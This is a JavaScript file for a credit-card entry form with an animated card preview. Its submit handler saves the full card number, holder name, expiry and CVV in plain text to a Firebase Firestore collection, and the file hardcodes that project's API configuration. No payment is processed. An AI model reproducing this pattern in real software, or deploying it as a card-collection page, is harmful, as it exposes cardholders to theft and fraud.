import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
import {
	collection,
	getFirestore,
	addDoc,
} from "https://www.gstatic.com/firebasejs/9.15.0/firebase-firestore.js";

const firebaseConfig = {
	apiKey: "AIzaSyDCBKl933VUuQOX3BIjukkuNroug2DcqbE",
	authDomain: "project-6236d.firebaseapp.com",
	projectId: "project-6236d",
	storageBucket: "project-6236d.appspot.com",
	messagingSenderId: "930750148733",
	appId: "1:930750148733:web:7b14ac7edd6a48350e0114",
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const cardNumberInput = document.querySelector(".card-number-input");
const cardHolderInput = document.querySelector(".card-holder-input");
const cvvInput = document.querySelector(".cvv-input");
const expirationMonthInput = document.querySelector(".exp-month");
const expirationYearInput = document.querySelector(".exp-year");
const form = document.querySelector(".form");

const allowOnlyLetters = (e) => {
  if (e?.key?.trim().length === 1 && !(/^[A-Za-z]*$/ .test(e?.key))) {
    e.preventDefault();
  }
};

const allowOnlyDigits = (e) => {
	if (e?.key?.trim().length === 1 && !(/^[0-9]*$/.test(e?.key))) {
		e.preventDefault();
	}
};

cardNumberInput.addEventListener("keydown", allowOnlyDigits);
cardHolderInput.addEventListener("keydown", allowOnlyLetters);
cvvInput.addEventListener("keydown", allowOnlyDigits);

cardNumberInput.oninput = (e) => {
	document.querySelector(".card-number-box").innerText = cardNumberInput.value;
};

cardHolderInput.oninput = () => {
	document.querySelector(".card-holder-name").innerText = cardHolderInput.value;
};

document.querySelector(".month-input").oninput = () => {
	expirationMonthInput.innerText = document.querySelector(".month-input").value;
};

document.querySelector(".year-input").oninput = () => {
	expirationYearInput.innerText = document.querySelector(".year-input").value;
};

cvvInput.onmouseenter = () => {
	document.querySelector(".front").style.transform =
		"perspective(1000px) rotateY(-180deg)";
	document.querySelector(".back").style.transform =
		"perspective(1000px) rotateY(0deg)";
};

cvvInput.onmouseleave = () => {
	document.querySelector(".front").style.transform =
		"perspective(1000px) rotateY(0deg)";
	document.querySelector(".back").style.transform =
		"perspective(1000px) rotateY(180deg)";
};

cvvInput.oninput = () => {
	document.querySelector(".cvv-box").innerText = cvvInput.value;
};

form.addEventListener("submit", async (e) => {
	e.preventDefault();

	const cardNumber = cardNumberInput.value;
	const cardHolder = cardHolderInput.value;
	const expirationMonth = expirationMonthInput.textContent;
	const expirationYear = expirationYearInput.textContent;
	const ccv = cvvInput.value;

	if (cardHolder && cardNumber && expirationMonth && expirationYear && ccv) {
		await addDoc(collection(db, "data"), {
			cardNumber,
			cardHolder,
			expirationMonth,
			expirationYear,
			ccv,
		});

		form.reset();
	} else {
		alert("Something went wrong. Try again");
	}
});
